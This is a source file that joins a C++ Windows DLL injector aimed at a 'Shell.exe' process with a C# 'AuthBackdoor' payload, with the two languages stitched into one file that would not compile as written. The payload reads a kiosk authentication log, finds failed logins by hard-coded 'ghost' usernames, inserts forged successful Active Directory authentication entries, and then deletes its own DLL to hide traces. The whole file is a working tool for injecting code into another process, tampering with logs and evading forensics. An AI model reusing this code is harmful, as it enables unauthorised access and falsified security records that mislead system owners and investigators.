// dll_injector_shell.cpp
// CLI-based DLL injector for Windows 10/11
// Injects AuthBackdoor.dll into Shell.exe

#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <iostream>
using System;
using System.IO;
using System.Linq;
using System.Threading;
DWORD GetProcessIdByName(const std::wstring& processName) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (!_wcsicmp(entry.szExeFile, processName.c_str())) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return 0;
}

bool InjectDLL(DWORD pid, const std::wstring& dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::wcerr << L"[-] Failed to open target process." << std::endl;
        return false;
    }

    void* pRemotePath = VirtualAllocEx(hProcess, nullptr, (dllPath.size() + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
    if (!pRemotePath) {
        std::wcerr << L"[-] Failed to allocate memory in target process." << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    WriteProcessMemory(hProcess, pRemotePath, dllPath.c_str(), (dllPath.size() + 1) * sizeof(wchar_t), nullptr);

    HMODULE hKernel32 = GetModuleHandleW(L"Kernel32");
    FARPROC pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pRemotePath, 0, nullptr);
    if (!hThread) {
        std::wcerr << L"[-] Failed to create remote thread." << std::endl;
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return true;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc != 2) {
        std::wcout << L"Usage: dll_injector_shell.exe <FullPathToDLL>" << std::endl;
        return 1;
    }

    std::wstring dllPath = argv[1];
    DWORD pid = GetProcessIdByName(L"Shell.exe");

    if (pid == 0) {
        std::wcerr << L"[-] Shell.exe process not found." << std::endl;
        return 1;
    }

    if (InjectDLL(pid, dllPath)) {
        std::wcout << L"[+] DLL injected successfully into Shell.exe (PID: " << pid << L")." << std::endl;
    } else {
        std::wcerr << L"[-] DLL injection failed." << std::endl;
    }

    return 0;
}
namespace AuthBackdoor
{
    public class EntryPoint
    {
        private static readonly string[] GhostUsers = new[] {
            "Antonnet.puppettino",
            "dididothaAT",
            "mcrib"
        };

        private static bool SelfDestructEnabled = true;

        public static void Run()
        {
            new Thread(() => MainLogic()).Start();
        }

        private static void MainLogic()
        {
            string authLogPath = "C:\\Kiosk\\Logs\\auth.log"; // Adjust to actual path

            while (true)
            {
                try
                {
                    if (!File.Exists(authLogPath))
                    {
                        Thread.Sleep(2000);
                        continue;
                    }

                    var lines = File.ReadAllLines(authLogPath);

                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (lines[i].Contains("Unable to authenticate user: "))
                        {
                            var user = ExtractUser(lines[i]);
                            if (GhostUsers.Contains(user))
                            {
                                lines[i] += $"\n{Timestamp()} : Attempting to authenticate user: {user} | active directory authentication";
                                lines[i] += $"\n{Timestamp()} : User: {user}, successfully authenticated against configured AD server | active directory authentication";

                                File.WriteAllLines(authLogPath, lines);

                                if (SelfDestructEnabled)
                                {
                                    TriggerSelfDestruct();
                                    return;
                                }
                            }
                        }
                    }
                }
                catch {}

                Thread.Sleep(3000);
            }
        }

        private static string ExtractUser(string logLine)
        {
            int start = logLine.IndexOf("user:") + 5;
            int end = logLine.IndexOf(",", start);
            if (start < 0 || end < 0 || end <= start) return "unknown";
            return logLine.Substring(start, end - start).Trim();
        }

        private static string Timestamp()
        {
            return DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fff");
        }

        private static void TriggerSelfDestruct()
        {
            string dllPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            Thread.Sleep(2000);
            try { File.Delete(dllPath); } catch {}
        }
    }
}
